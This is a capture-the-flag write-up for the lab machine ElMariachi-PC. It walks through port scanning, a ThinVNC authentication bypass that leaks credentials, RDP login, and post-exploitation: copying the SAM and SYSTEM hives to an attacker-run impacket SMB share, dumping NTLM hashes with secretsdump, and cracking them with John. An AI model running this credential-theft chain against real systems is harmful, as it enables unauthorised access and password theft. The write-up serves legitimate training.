---
title: PwnTillDawn - ElMariachi-PC Writeup
published: true
---


This is a machine from the platform PwnTillDawn.

Check the platform by yourself and happy hacking:

[https://www.wizlynxgroup.com/](https://www.wizlynxgroup.com/)

[https://online.pwntilldawn.com/](https://online.pwntilldawn.com/)

Machine details:

> OS: Windows
>
> Rated as: Easy
>
> IP: 10.150.150.69
>
> Goal: Become admin and capture 1 flag: FLAG67.txt.

# [](#header-1)Manual OS fingerprinting.

Pinging the machine and based on the [TTL](https://subinsb.com/default-device-ttl-values/) I can conclude it's a Windows box:

```bash

└─$ ping -c 1 10.150.150.69
PING 10.150.150.69 (10.150.150.69) 56(84) bytes of data.
64 bytes from 10.150.150.69: icmp_seq=1 ttl=127 time=170 ms

--- 10.150.150.69 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 170.245/170.245/170.245/0.000 ms
```

# [](#header-1)Port scanning.

I use two port scans, in the first one I discover all open ports. In the second I perform a scan over those 
discovered ports trying to discover the service versions and also try basic Nmap enum scripts.

## [](#header-2)First scan.

```bash
└─$ IP=10.150.150.69;nmap -p- --min-rate=5000 -n -sT -Pn -oG allports --open $IP
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-03 17:15 EDT
Nmap scan report for 10.150.150.69
Host is up (0.17s latency).
Not shown: 64795 closed ports, 726 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
5040/tcp  open  unknown
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
50417/tcp open  unknown
60000/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 19.98 seconds
```


*    In the first part, I declare the IP of the machine as an env variable, because it reduces me time when doing the scans.
*    `-p-`: Scan all TCP ports.
*    `--min-rate=5000`: I want to go fast, remember this is a controlled environment, not recommended in corporate environments.
*    `-n`: Don't use DNS resolution (It goes faster this way).
*    `-sT`: Use TCP connect scan. I prefer this rather than the default (stealth).
*    `-Pn`: Don't do host discovery on the machine, it can save me some time. Before the scan I always test reachability to the machine.
*    `-oG allports`: Saves the Nmap output in grepable format to a file called **allports**.
*    `--open`: Only shows me open ports.
*    `$IP`: This is where I call my env variable the IP of the machine.


```bash
└─$ extract allports
Open ports:  135,139,445,3389,5040,49664,49665,49666,49667,49668,49669,49670,50417,60000
```
If you want more info about that extract function, you can read [this post](https://juansec.github.io/PwnTillDawn-JuniorDev-Writeup).

## [](#header-2) Second scan.

```bash
└─$ nmap -p$ports --min-rate=1000 -sC -sV -n -Pn -oN targeted $IP
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-03 17:44 EDT
Nmap scan report for 10.150.150.69
Host is up (0.17s latency).

PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: ELMARIACHI-PC
|   NetBIOS_Domain_Name: ELMARIACHI-PC
|   NetBIOS_Computer_Name: ELMARIACHI-PC
|   DNS_Domain_Name: ElMariachi-PC
|   DNS_Computer_Name: ElMariachi-PC
|   Product_Version: 10.0.17763
|_  System_Time: 2021-10-03T22:36:33+00:00
| ssl-cert: Subject: commonName=ElMariachi-PC
| Not valid before: 2021-10-02T19:18:50
|_Not valid after:  2022-04-03T19:18:50
|_ssl-date: 2021-10-03T22:37:03+00:00; +49m21s from scanner time.
5040/tcp  open  unknown
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
50417/tcp open  msrpc         Microsoft Windows RPC
60000/tcp open  unknown
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 Not Found
|     Content-Type: text/html
|     Content-Length: 177
|     Connection: Keep-Alive
|     <HTML><HEAD><TITLE>404 Not Found</TITLE></HEAD><BODY><H1>404 Not Found</H1>The requested URL nice%20ports%2C/Tri%6Eity.txt%2ebak was not found on this server.<P></BODY></HTML>
|   GetRequest: 
|     HTTP/1.1 401 Access Denied
|     Content-Type: text/html
|     Content-Length: 144
|     Connection: Keep-Alive
|     WWW-Authenticate: Digest realm="ThinVNC", qop="auth", nonce="8ZpDwhS35UDI1kcCFLflQA==", opaque="s5DGjSXV3HxDhmXNk4uwNebK5PxukPh3xK"
|_    <HTML><HEAD><TITLE>401 Access Denied</TITLE></HEAD><BODY><H1>401 Access Denied</H1>The requested URL requires authorization.<P></BODY></HTML>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port60000-TCP:V=7.91%I=7%D=10/3%Time=615A2454%P=x86_64-pc-linux-gnu%r(G
SF:etRequest,179,"HTTP/1\.1\x20401\x20Access\x20Denied\r\nContent-Type:\x2
SF:0text/html\r\nContent-Length:\x20144\r\nConnection:\x20Keep-Alive\r\nWW
SF:W-Authenticate:\x20Digest\x20realm=\"ThinVNC\",\x20qop=\"auth\",\x20non
SF:ce=\"8ZpDwhS35UDI1kcCFLflQA==\",\x20opaque=\"s5DGjSXV3HxDhmXNk4uwNebK5P
SF:xukPh3xK\"\r\n\r\n<HTML><HEAD><TITLE>401\x20Access\x20Denied</TITLE></H
SF:EAD><BODY><H1>401\x20Access\x20Denied</H1>The\x20requested\x20URL\x20\x
SF:20requires\x20authorization\.<P></BODY></HTML>\r\n")%r(FourOhFourReques
SF:t,111,"HTTP/1\.1\x20404\x20Not\x20Found\r\nContent-Type:\x20text/html\r
SF:\nContent-Length:\x20177\r\nConnection:\x20Keep-Alive\r\n\r\n<HTML><HEA
SF:D><TITLE>404\x20Not\x20Found</TITLE></HEAD><BODY><H1>404\x20Not\x20Foun
SF:d</H1>The\x20requested\x20URL\x20nice%20ports%2C/Tri%6Eity\.txt%2ebak\x
SF:20was\x20not\x20found\x20on\x20this\x20server\.<P></BODY></HTML>\r\n");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 49m20s, deviation: 0s, median: 49m20s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-10-03T22:36:34
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 193.85 seconds

```

*    `-p$ports`: Only scan the ports I discovered from the previous scan.
*    `--min-rate=1000`: Fast scan.
*    `-sC`: Perform Nmap default scripts scan.
*    `-sV`: Do version detection.
*    `-n`: Don't do DNS resolution.
*    `-Pn`: Don't do host discovery.
*    `-oN targeted`: Save the output to a file called targeted, using the normal format.
*    `$IP`: This is the variable containing the IP.


# [](#header-1)SMB service analysis.

First I decided to go after SMB service, I tried manually to login with guest user using `smbmap` and `smbclient`:
```bash
└─$ smbmap -H 10.150.150.69                                                                     
[!] Authentication error on 10.150.150.69
```

```bash
└─$ smbclient -L 10.150.150.69 -U 'guest'
Enter WORKGROUP\guest's password: 
session setup failed: NT_STATUS_ACCOUNT_DISABLED
```

I was not lucky.


# [](#header-1)Port 5040.

Nmap scan showed us an open port which service version wasn't identified, let's take a look: 

```bash
└─$ telnet 10.150.150.69 5040            
Trying 10.150.150.69...
Connected to 10.150.150.69.
Escape character is '^]'.
ehlo
whoami


```

```bash
└─$ nc -nv 10.150.150.69 5040
(UNKNOWN) [10.150.150.69] 5040 (?) open


```

Again I had no luck, looking [here](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/mt670791(v=ws.11)) seems like that port could be related 
to the `RPC` service.

# [](#header-1)Web service on port 60000.

The output of nmap told us that there could be a web service running on that port. After manually visiting it we face a login box:

![](assets/login_thinvnc.png)

The message says that the box is running ThinVNC, which is a web based [software](https://sourceforge.net/projects/thinvnc/) for remote control compatible with VNC.

Googling to find out default credentials of the service I found an [interesting article](https://redteamzone.com/ThinVNC/) detailing a vulnerability of authentication bypass which also covers LFI.

Manually testing it via BurpSuite we can extract the ThinVNC's credentials:

![](assets/thin_creds.png)

And now we can login via ThinVNC:

![](assets/thin1.png)

However, the connection was veeery slow.

# [](#header-1)Login via RDP.

I tried the credentials of the ThinVNC service to access via RDP and I got a big success:

```bash
└─$ xfreerdp +clipboard /u:desperado /v:10.150.150.69                                                                                                                 130 ⨯
[18:59:13:841] [172747:172748] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
[18:59:13:841] [172747:172748] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr
[18:59:13:841] [172747:172748] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpsnd
[18:59:13:841] [172747:172748] [INFO][com.freerdp.client.common.cmdline] - loading channelEx cliprdr
[18:59:13:154] [172747:172748] [INFO][com.freerdp.primitives] - primitives autodetect, using optimized
[18:59:13:159] [172747:172748] [INFO][com.freerdp.core] - freerdp_tcp_is_hostname_resolvable:freerdp_set_last_error_ex resetting error state
[18:59:13:159] [172747:172748] [INFO][com.freerdp.core] - freerdp_tcp_connect:freerdp_set_last_error_ex resetting error state
[18:59:14:859] [172747:172748] [WARN][com.freerdp.crypto] - Certificate verification failure 'self signed certificate (18)' at stack position 0
[18:59:14:859] [172747:172748] [WARN][com.freerdp.crypto] - CN = ElMariachi-PC
Password:
```

![](assets/rdp1.png)

Our user `desperado` has admin privileges, that's nice.

Let's capture that flag:

![](assets/FLAG67.png)

And with that the machine is done, right?

# [](#header-1)A little bit of post-exploitation.

Let's extract the NTLM hashes of the machine.

First we set up a SMB server in our attacking machine using `impacket`:

```bash
└─# sudo impacket-smbserver tool . -smb2support
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

Then we transfer `SAM` and `SYSTEM` files from our victim to our machine via SMB.
![](assets/sam.png)

Big success.

Now we use `impacket` again to extract the hashes and save it to a file:

```bash
└─$ impacket-secretsdump -sam SAM -system SYSTEM LOCAL > sam_dump; cat sam_dump                                                                                         1 ⨯
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Target system bootKey: 0x13dc8b2d3be447472e92938a1327cae9
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:35a619ab012f0a6d6daf24eccfb0b11f:::
Desperado:1004:aad3b435b51404eeaad3b435b51404ee:8fa2fdb26cd02c75c2c59bccad8dd9a0:::
[*] Cleaning up... 
```

Finally we remove unnecessary lines of the file and pass it through `JTR` with the help of `rockyou.txt` to see if we can crack Admin's pass:

```bash
└─$ john --w=/usr/share/wordlists/rockyou.txt hashes --format=NT
Using default input encoding: UTF-8
Loaded 3 password hashes with no different salts (NT [MD4 256/256 AVX2 8x3])
Remaining 2 password hashes with no different salts
Warning: no OpenMP support for this hash type, consider --fork=2
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:01 DONE (2021-10-03 19:21) 0g/s 7355Kp/s 7355Kc/s 14711KC/s  _ 09..*7¡Vamos!
Session completed
```

Sadly we couldn't get any more passwords.

# [](header-1)Skills used.

*    Port enumeration with `Nmap`.
*    Manual service fingerprinting.
*    Google searching.
*    BurpSuite for exploiting LFI.
*    impacket for transfer files via SMB and extracting NTLM hashes.
*    JTR for cracking purposes.

# [](header-1)Final thoughts.

I didn't know about the existence of ThinVNC, now I know it could be vulnerable thanks to this machine :).
